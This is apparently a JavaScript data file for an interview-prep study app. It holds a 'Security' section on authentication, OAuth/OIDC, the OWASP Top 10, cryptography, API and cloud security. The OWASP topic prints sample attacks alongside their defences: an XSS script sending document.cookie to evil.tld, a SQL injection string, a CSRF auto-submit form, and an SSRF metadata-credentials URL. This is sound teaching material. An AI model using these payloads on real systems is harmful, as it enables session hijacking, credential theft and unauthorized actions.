/* Security for software engineers. */
window.STUDY_SECTIONS = window.STUDY_SECTIONS || [];
window.STUDY_SECTIONS.push({
  id: "security",
  title: "Security",
  icon: "🔐",
  blurb: "Authentication & authorization (sessions, JWT, OAuth2/OIDC), the OWASP Top 10, applied cryptography & TLS, API security, secrets management and cloud/zero-trust security.",
  topics: [
    {
      id: "sec-authn",
      title: "Authentication: Passwords, Sessions, JWT, MFA, Passkeys",
      summary: "Proving who a user is — storing passwords safely, session cookies vs tokens, JWT trade-offs, MFA and passwordless login.",
      tags: ["auth", "jwt", "must-know"],
      brushup: [
        "Never store passwords; store a slow, salted hash: <b>Argon2id</b>, <b>bcrypt</b> or scrypt (not SHA-256/MD5).",
        "<b>Session-based</b>: server stores session, browser holds an opaque cookie (HttpOnly, Secure, SameSite). Easy revocation.",
        "<b>Token-based (JWT)</b>: signed claims (header.payload.signature), stateless verification; hard to revoke → short expiry + refresh tokens.",
        "JWT pitfalls: don't put secrets in the payload (it's only base64), verify the algorithm (reject 'none', pin RS256/ES256), validate iss/aud/exp.",
        "Store tokens in browsers carefully: HttpOnly cookies avoid XSS theft (then protect against CSRF); localStorage is readable by any injected script.",
        "<b>MFA</b>: TOTP apps, WebAuthn/passkeys (phishing-resistant), SMS is weakest.",
        "Protect login: rate limiting, account lockout/backoff, breached-password checks, generic error messages (no user enumeration).",
        "Password reset: single-use, short-lived, random tokens sent out-of-band; invalidate sessions after reset.",
      ],
      detail: `
<h2>Password hashing</h2>
<pre><code># Python (argon2-cffi)
from argon2 import PasswordHasher
ph = PasswordHasher()                  # memory-hard, per-hash random salt embedded in the output
stored = ph.hash("correct horse")
ph.verify(stored, attempt)             # raises on mismatch; ph.check_needs_rehash(stored) to upgrade params</code></pre>
<p>Fast hashes let attackers try billions of guesses per second on GPUs; Argon2/bcrypt are deliberately slow and (Argon2) memory-hard. A <b>pepper</b> (secret key in an HSM/KMS) adds defence if the DB leaks.</p>

<h2>Sessions vs JWT</h2>
<table>
<tr><th></th><th>Server session + cookie</th><th>JWT access token</th></tr>
<tr><td>State</td><td>Server-side store (Redis/DB)</td><td>Stateless, self-contained</td></tr>
<tr><td>Revocation</td><td>Delete the session</td><td>Hard — wait for expiry or keep a denylist</td></tr>
<tr><td>Scaling</td><td>Shared session store</td><td>Any service can verify with the public key</td></tr>
<tr><td>Size</td><td>Small ID</td><td>Grows with claims</td></tr>
<tr><td>Best for</td><td>Browser web apps</td><td>Service-to-service, mobile/SPA APIs with short expiry</td></tr>
</table>

<h2>JWT anatomy and verification</h2>
<pre><code>eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMyJ9 . eyJzdWIiOiI0MiIsImF1ZCI6ImFwaSIsImV4cCI6MTc5MH0 . &lt;signature&gt;
header: {"alg":"RS256","kid":"123"}   payload: {"sub":"42","aud":"api","exp":1790000000,"scope":"orders:read"}

verify: fetch the key by kid from the issuer's JWKS → check signature with the EXPECTED alg
        → check exp/nbf (small clock skew), iss, aud → then authorize using scopes/claims</code></pre>
<p>Refresh token rotation: each refresh issues a new refresh token and invalidates the old one; reuse of an old one signals theft → revoke the family.</p>

<h2>Cookie flags</h2>
<ul>
<li><b>HttpOnly</b> — JavaScript can't read it (XSS can't steal it).</li>
<li><b>Secure</b> — HTTPS only. <b>SameSite=Lax/Strict</b> — mitigates CSRF.</li>
<li>Scope with Path/Domain; rotate session ID after login (session fixation).</li>
</ul>

<h2>Passkeys (WebAuthn)</h2>
<p>A per-site key pair; the private key never leaves the device/authenticator; login signs a server challenge bound to the origin → phishing-resistant, nothing reusable leaks from the server.</p>`,
      pitfalls: [
        "Hashing passwords with SHA-256 or without salt.",
        "Long-lived JWTs with no revocation strategy.",
        "Accepting the JWT alg from the token header (alg=none / HS256 with public key confusion).",
        "Tokens in localStorage in an app with any XSS risk.",
        "Different error messages for 'no such user' vs 'wrong password'.",
      ],
      interviewQs: [
        "How should passwords be stored?",
        "Sessions vs JWT — pros and cons?",
        "How do you revoke a JWT?",
        "Where should a browser app store tokens?",
        "How does MFA with TOTP work? Why are passkeys better?",
      ],
      resources: [
        { t: "OWASP Password Storage Cheat Sheet", u: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html", k: "docs" },
        { t: "OWASP Authentication Cheat Sheet", u: "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html", k: "docs" },
        { t: "JWT.io introduction", u: "https://jwt.io/introduction", k: "article" },
        { t: "passkeys.dev", u: "https://passkeys.dev/", k: "docs" },
      ],
    },
    {
      id: "sec-oauth",
      title: "Authorization, OAuth 2.0, OpenID Connect & SSO",
      summary: "Who can do what: RBAC/ABAC models, and how OAuth 2.0 delegates access while OIDC adds identity for single sign-on.",
      tags: ["oauth", "oidc", "authorization"],
      brushup: [
        "Authentication = who you are; <b>authorization</b> = what you may do. Enforce authz server-side on every request.",
        "Models: <b>RBAC</b> (roles), <b>ABAC</b> (attributes/policies), <b>ReBAC</b> (relationships — Google Zanzibar, OpenFGA).",
        "<b>OAuth 2.0</b> = delegated authorization: a client gets an <b>access token</b> from an <b>authorization server</b> to call a <b>resource server</b> on behalf of a <b>resource owner</b>.",
        "Flows: <b>Authorization Code + PKCE</b> (web, SPA, mobile), <b>Client Credentials</b> (service-to-service), Device Code (TVs/CLIs). Implicit and password grants are deprecated.",
        "<b>OIDC</b> adds an <b>ID token</b> (JWT about the user) + userinfo endpoint → login/SSO. OAuth alone is not authentication.",
        "Scopes limit what a token can do; audience limits where it can be used.",
        "SSO protocols: OIDC (modern) and SAML (enterprise XML).",
        "IDOR / broken object-level authorization is the #1 API vulnerability — check ownership of every object ID.",
      ],
      detail: `
<h2>Authorization Code + PKCE</h2>
<pre><code>1. App creates code_verifier (random) and code_challenge = SHA256(verifier)
2. Browser → /authorize?response_type=code&amp;client_id=..&amp;redirect_uri=..&amp;scope=openid orders:read
                        &amp;state=xyz&amp;code_challenge=..&amp;code_challenge_method=S256
3. User logs in + consents at the authorization server
4. Redirect back: redirect_uri?code=AUTH_CODE&amp;state=xyz        (check state → CSRF protection)
5. App → POST /token {code, code_verifier, redirect_uri}        (PKCE proves it's the same app)
6. ← access_token (+ refresh_token, + id_token with OIDC)
7. App → API with Authorization: Bearer &lt;access_token&gt;</code></pre>

<h2>Client credentials (machine to machine)</h2>
<pre><code>POST /token  grant_type=client_credentials&amp;client_id=billing&amp;client_secret=…&amp;scope=invoices:write
→ access_token for service "billing"; prefer mTLS or private_key_jwt over shared secrets</code></pre>

<h2>RBAC vs ABAC vs ReBAC</h2>
<table>
<tr><th>Model</th><th>Rule example</th><th>Good for</th></tr>
<tr><td>RBAC</td><td>role=admin can delete projects</td><td>Simple apps, admin panels</td></tr>
<tr><td>ABAC</td><td>allow if user.dept == doc.dept and time in business hours</td><td>Fine-grained, contextual policies (OPA/Cedar)</td></tr>
<tr><td>ReBAC</td><td>user can edit doc if user ∈ doc.folder.editors</td><td>Google Docs-style sharing (Zanzibar, OpenFGA, SpiceDB)</td></tr>
</table>

<h2>Object-level authorization</h2>
<pre><code>GET /api/invoices/9912
# WRONG: SELECT * FROM invoices WHERE id = 9912
# RIGHT: SELECT * FROM invoices WHERE id = 9912 AND account_id = :callerAccount   → 404 if not theirs</code></pre>`,
      pitfalls: [
        "Using OAuth access tokens as proof of identity (use OIDC ID tokens).",
        "Missing state/PKCE → authorization code interception / CSRF.",
        "Checking permissions only in the UI.",
        "Wildcard redirect URIs.",
        "IDOR: trusting object IDs from the client.",
      ],
      interviewQs: [
        "Explain the OAuth 2.0 authorization code flow with PKCE.",
        "OAuth vs OpenID Connect?",
        "How do microservices authenticate to each other?",
        "RBAC vs ABAC?",
        "What is an IDOR vulnerability and how do you prevent it?",
      ],
      resources: [
        { t: "OAuth 2.0 simplified — Aaron Parecki", u: "https://www.oauth.com/", k: "book" },
        { t: "OpenID Connect explained", u: "https://openid.net/developers/how-connect-works/", k: "docs" },
        { t: "Google Zanzibar paper", u: "https://research.google/pubs/zanzibar-googles-consistent-global-authorization-system/", k: "paper" },
      ],
    },
    {
      id: "sec-owasp",
      title: "OWASP Top 10: Injection, XSS, CSRF, SSRF & More",
      summary: "The most common web vulnerabilities, how attacks work, and the specific defences for each.",
      tags: ["owasp", "web-security", "must-know"],
      brushup: [
        "<b>Injection</b> (SQL, NoSQL, command, LDAP): untrusted input interpreted as code → <b>parameterized queries</b>, never string concatenation.",
        "<b>XSS</b>: attacker script runs in victims' browsers (stored, reflected, DOM) → context-aware output encoding, frameworks' auto-escaping, <b>Content Security Policy</b>, HttpOnly cookies.",
        "<b>CSRF</b>: a malicious site makes the victim's browser send an authenticated request → SameSite cookies, anti-CSRF tokens, check Origin.",
        "<b>SSRF</b>: server fetches attacker-chosen URLs (e.g. cloud metadata 169.254.169.254) → allowlists, block internal ranges, IMDSv2.",
        "<b>Broken access control</b> is #1 in OWASP 2021: IDOR, missing function-level checks, path traversal.",
        "Security misconfiguration, vulnerable dependencies, cryptographic failures, insecure deserialization, logging/monitoring failures.",
        "Defence in depth: validate input (allowlist), encode output, least privilege, secure defaults, dependency scanning.",
      ],
      detail: `
<h2>SQL injection</h2>
<pre><code>// vulnerable
String q = "SELECT * FROM users WHERE email = '" + email + "'";     // email = ' OR '1'='1
// safe
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email = ?");
ps.setString(1, email);</code></pre>
<p>ORMs are safe until you build raw queries with string concatenation. Identifiers (column names in ORDER BY) can't be parameterized → allowlist them.</p>

<h2>XSS</h2>
<pre><code>&lt;!-- stored XSS: comment body rendered unescaped --&gt;
&lt;div&gt;&lt;script&gt;fetch('https://evil.tld?c='+document.cookie)&lt;/script&gt;&lt;/div&gt;

Defences:
- React/Angular escape by default; avoid dangerouslySetInnerHTML / innerHTML with user data
- Sanitize rich HTML with DOMPurify
- CSP: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'
- HttpOnly session cookies</code></pre>

<h2>CSRF</h2>
<pre><code>&lt;!-- on evil.tld --&gt;
&lt;form action="https://bank.com/transfer" method="POST"&gt;&lt;input name="to" value="attacker"&gt;...&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;   ← browser attaches bank.com cookies</code></pre>
<p>Defences: SameSite=Lax/Strict cookies, synchronizer or double-submit tokens, verify Origin/Referer; APIs using Authorization headers (not cookies) aren't CSRF-able.</p>

<h2>SSRF</h2>
<p>Feature: "import image from URL". Attacker passes <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> → steals cloud credentials (Capital One breach). Defences: allowlist domains, resolve DNS and block private/link-local IPs (and re-check after redirects), use IMDSv2, run fetchers in an isolated network.</p>

<h2>OWASP Top 10 (2021)</h2>
<ol>
<li>Broken Access Control</li><li>Cryptographic Failures</li><li>Injection (incl. XSS)</li><li>Insecure Design</li><li>Security Misconfiguration</li>
<li>Vulnerable & Outdated Components</li><li>Identification & Authentication Failures</li><li>Software & Data Integrity Failures</li><li>Security Logging & Monitoring Failures</li><li>SSRF</li>
</ol>`,
      pitfalls: [
        "Blacklist-based input filtering (always bypassable).",
        "Escaping for the wrong context (HTML vs attribute vs JS vs URL).",
        "Deserializing untrusted data with native serializers (Java ObjectInputStream, pickle).",
        "Verbose error pages leaking stack traces and versions.",
      ],
      interviewQs: [
        "How does SQL injection work and how do you prevent it?",
        "Explain XSS types and defences.",
        "What is CSRF? Why do SameSite cookies help?",
        "What is SSRF and why is it dangerous in the cloud?",
        "Name the OWASP Top 10 categories.",
      ],
      resources: [
        { t: "OWASP Top 10", u: "https://owasp.org/Top10/", k: "docs" },
        { t: "OWASP Cheat Sheet Series", u: "https://cheatsheetseries.owasp.org/", k: "docs" },
        { t: "PortSwigger Web Security Academy (free labs)", u: "https://portswigger.net/web-security", k: "practice" },
      ],
    },
    {
      id: "sec-crypto",
      title: "Applied Cryptography & TLS",
      summary: "What engineers need to know about hashing, symmetric and asymmetric encryption, signatures, key management and how TLS secures connections.",
      tags: ["crypto", "tls"],
      brushup: [
        "<b>Hash</b> (SHA-256): one-way fingerprint; <b>HMAC</b>: keyed hash for integrity/authenticity (webhook signatures).",
        "<b>Symmetric</b> (AES-GCM, ChaCha20-Poly1305): one shared key, fast, authenticated encryption; never reuse a nonce.",
        "<b>Asymmetric</b> (RSA, ECDSA/Ed25519, X25519): public/private keys for key exchange and <b>signatures</b>.",
        "<b>TLS 1.3</b>: ECDHE key exchange (forward secrecy) + certificate authentication + AEAD; 1-RTT handshake (0-RTT resumption with replay caveats).",
        "Certificates: chain to a trusted CA; check hostname (SAN), expiry; automate renewal (ACME/Let's Encrypt); <b>mTLS</b> authenticates both sides (service meshes).",
        "<b>Envelope encryption</b>: data key encrypts data; KMS master key encrypts the data key; rotate keys.",
        "Don't roll your own crypto; use libsodium/Tink/platform libraries; use constant-time comparison for secrets.",
        "Encoding (base64) ≠ encryption; hashing ≠ encryption.",
      ],
      detail: `
<h2>TLS 1.3 handshake (simplified)</h2>
<pre><code>Client → ClientHello: supported ciphers, key share (ECDHE public key), SNI
Server → ServerHello: chosen cipher, key share
         {EncryptedExtensions, Certificate, CertificateVerify (signature), Finished}   ← already encrypted
Client: verify cert chain + hostname + signature → derive keys → Finished
→ application data encrypted with AES-GCM/ChaCha20 keys derived from the ECDHE shared secret</code></pre>
<p><b>Forward secrecy</b>: session keys come from ephemeral Diffie-Hellman, so stealing the server's private key later doesn't decrypt recorded traffic.</p>

<h2>Which primitive for which job</h2>
<table>
<tr><th>Goal</th><th>Use</th></tr>
<tr><td>Store passwords</td><td>Argon2id / bcrypt</td></tr>
<tr><td>Detect tampering with a shared secret</td><td>HMAC-SHA256</td></tr>
<tr><td>Encrypt data at rest</td><td>AES-256-GCM with KMS-managed keys (envelope encryption)</td></tr>
<tr><td>Prove who signed something</td><td>Ed25519 / ECDSA / RSA-PSS signatures</td></tr>
<tr><td>Agree on a key over the network</td><td>X25519 (ECDHE) — inside TLS</td></tr>
<tr><td>Random tokens</td><td>CSPRNG (SecureRandom, secrets.token_urlsafe)</td></tr>
</table>

<h2>Webhook signature verification</h2>
<pre><code>expected = HMAC_SHA256(secret, timestamp + "." + raw_body)
if not constant_time_equals(expected, header_signature) or now - timestamp &gt; 300: reject</code></pre>`,
      pitfalls: [
        "ECB mode or unauthenticated encryption (AES-CBC without MAC).",
        "Reusing nonces with GCM.",
        "Disabling certificate validation to 'fix' TLS errors.",
        "Using Math.random/Random for tokens.",
        "Keys stored next to the data they protect.",
      ],
      interviewQs: [
        "Symmetric vs asymmetric encryption — where is each used?",
        "Walk through the TLS handshake. What is forward secrecy?",
        "Hashing vs encryption vs encoding?",
        "What is mTLS and when would you use it?",
        "How would you encrypt sensitive columns in a database?",
      ],
      resources: [
        { t: "The Illustrated TLS 1.3 Connection", u: "https://tls13.xargs.org/", k: "tool" },
        { t: "Cryptographic Right Answers (latacora)", u: "https://www.latacora.com/blog/2018/04/03/cryptographic-right-answers/", k: "article" },
        { t: "Serious Cryptography — J.-P. Aumasson", u: "https://nostarch.com/serious-cryptography-2nd-edition", k: "book" },
      ],
    },
    {
      id: "sec-api",
      title: "API Security, Secrets Management & Secure SDLC",
      summary: "Hardening APIs (validation, rate limits, OWASP API Top 10), keeping secrets out of code, and building security into the development lifecycle.",
      tags: ["api-security", "secrets"],
      brushup: [
        "OWASP API Top 10 highlights: broken object-level authorization, broken authentication, excessive data exposure, lack of rate limiting, mass assignment, SSRF.",
        "Validate input against a schema (types, lengths, ranges); reject unknown fields to prevent <b>mass assignment</b>.",
        "Return only needed fields (DTOs) — never serialize entities directly.",
        "Rate limit per user/key/IP; quotas; request size limits; pagination caps.",
        "Secrets: vault/secret manager (AWS Secrets Manager, HashiCorp Vault), short-lived dynamic credentials, workload identity; rotate; never in git, images, or logs.",
        "Scan: secret scanning (gitleaks, GitHub push protection), SAST, dependency scanning (SCA), DAST, container scanning.",
        "Threat modeling (STRIDE) at design time; security review for high-risk changes.",
        "Log security events (auth failures, permission denials) without logging secrets/PII.",
      ],
      detail: `
<h2>Mass assignment</h2>
<pre><code>PATCH /api/users/42  {"name": "Dee", "role": "admin"}      ← attacker adds a field
// vulnerable: user.update(requestBody)
// safe: bind to a DTO that only has allowed fields (name, avatar), ignore/reject extras</code></pre>

<h2>STRIDE threat model</h2>
<table>
<tr><th>Threat</th><th>Property violated</th><th>Example mitigation</th></tr>
<tr><td>Spoofing</td><td>Authentication</td><td>MFA, mTLS</td></tr>
<tr><td>Tampering</td><td>Integrity</td><td>Signatures, HMAC, TLS</td></tr>
<tr><td>Repudiation</td><td>Non-repudiation</td><td>Audit logs</td></tr>
<tr><td>Information disclosure</td><td>Confidentiality</td><td>Encryption, least privilege</td></tr>
<tr><td>Denial of service</td><td>Availability</td><td>Rate limits, autoscaling, WAF</td></tr>
<tr><td>Elevation of privilege</td><td>Authorization</td><td>Server-side checks, sandboxing</td></tr>
</table>

<h2>Secrets done right</h2>
<ul>
<li>Workloads get identities (IAM roles, Kubernetes service accounts with IRSA/Workload Identity) instead of static keys.</li>
<li>Vault dynamic DB credentials: each service instance gets unique, expiring credentials.</li>
<li>If a secret hits git: <b>rotate it immediately</b> — deleting the commit is not enough.</li>
</ul>`,
      pitfalls: [
        "Returning full database entities (password hashes, internal flags) in API responses.",
        "API keys in mobile apps or frontend bundles treated as secrets.",
        "Secrets in environment variables printed by debug endpoints or crash dumps.",
        "No rate limiting on login or OTP endpoints.",
      ],
      interviewQs: [
        "How do you secure a public REST API?",
        "What is mass assignment?",
        "How should services get database credentials?",
        "What would you do if a secret was committed to GitHub?",
        "How do you threat-model a new feature?",
      ],
      resources: [
        { t: "OWASP API Security Top 10", u: "https://owasp.org/API-Security/", k: "docs" },
        { t: "HashiCorp Vault docs", u: "https://developer.hashicorp.com/vault/docs", k: "docs" },
        { t: "Microsoft — STRIDE threat modeling", u: "https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats", k: "docs" },
      ],
    },
    {
      id: "sec-cloud",
      title: "Cloud & Infrastructure Security: IAM, Zero Trust, Network Defence",
      summary: "Least-privilege identity, network segmentation, zero-trust principles, and the guardrails that prevent the classic cloud breaches.",
      tags: ["cloud-security", "iam", "zero-trust"],
      brushup: [
        "Most cloud breaches: misconfigured storage, over-privileged IAM, leaked credentials, SSRF to metadata.",
        "<b>Least privilege</b>: scoped actions and resources, conditions, no wildcard admin; review with access analyzers.",
        "Separate accounts/projects per environment; guardrails with SCPs/org policies.",
        "<b>Zero trust</b>: never trust the network; authenticate and authorize every request (identity-aware proxies, mTLS, device posture).",
        "Network: private subnets, security groups, WAF, DDoS protection, egress controls.",
        "Encrypt at rest (KMS) and in transit (TLS everywhere, mTLS internally).",
        "Detection: CloudTrail/audit logs, GuardDuty-like threat detection, alerts on root usage and IAM changes.",
        "Kubernetes: RBAC, NetworkPolicies, Pod Security Standards (no privileged/root), image signing and admission policies.",
      ],
      detail: `
<h2>Least-privilege IAM policy</h2>
<pre><code>{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["s3:GetObject", "s3:PutObject"],
    "Resource": "arn:aws:s3:::acme-uploads/tenant-*/*",
    "Condition": {"StringEquals": {"aws:PrincipalTag/team": "uploads"}}
  }]
}</code></pre>

<h2>Zero trust vs perimeter</h2>
<table>
<tr><th>Perimeter model</th><th>Zero trust</th></tr>
<tr><td>Inside the VPN/network = trusted</td><td>Every request authenticated & authorized</td></tr>
<tr><td>Flat internal network</td><td>Micro-segmentation, mTLS between services</td></tr>
<tr><td>VPN for employees</td><td>Identity-aware proxy (BeyondCorp) with device checks</td></tr>
</table>

<h2>Kubernetes hardening checklist</h2>
<ul>
<li>RBAC least privilege; no cluster-admin for apps; disable default service account token automount where unused.</li>
<li>NetworkPolicies default-deny; allow only required flows.</li>
<li>Pods run as non-root, read-only root filesystem, drop capabilities, no hostPath/privileged.</li>
<li>Admission control (Kyverno/OPA Gatekeeper) enforcing signed images and policies.</li>
<li>Secrets encrypted at rest; external secret stores.</li>
</ul>`,
      pitfalls: [
        "Using root/owner credentials for day-to-day work.",
        "\"Action\": \"*\" policies attached to application roles.",
        "Flat networks where any compromised pod reaches the database.",
        "No alerting on IAM policy changes or public bucket creation.",
      ],
      interviewQs: [
        "How do you apply least privilege in AWS?",
        "What is zero trust?",
        "How would you secure a Kubernetes cluster?",
        "What are common causes of cloud data breaches?",
      ],
      resources: [
        { t: "Google BeyondCorp papers", u: "https://cloud.google.com/beyondcorp", k: "paper" },
        { t: "AWS Security Best Practices (IAM)", u: "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html", k: "docs" },
        { t: "Kubernetes security checklist", u: "https://kubernetes.io/docs/concepts/security/security-checklist/", k: "docs" },
      ],
    },
  ],
});
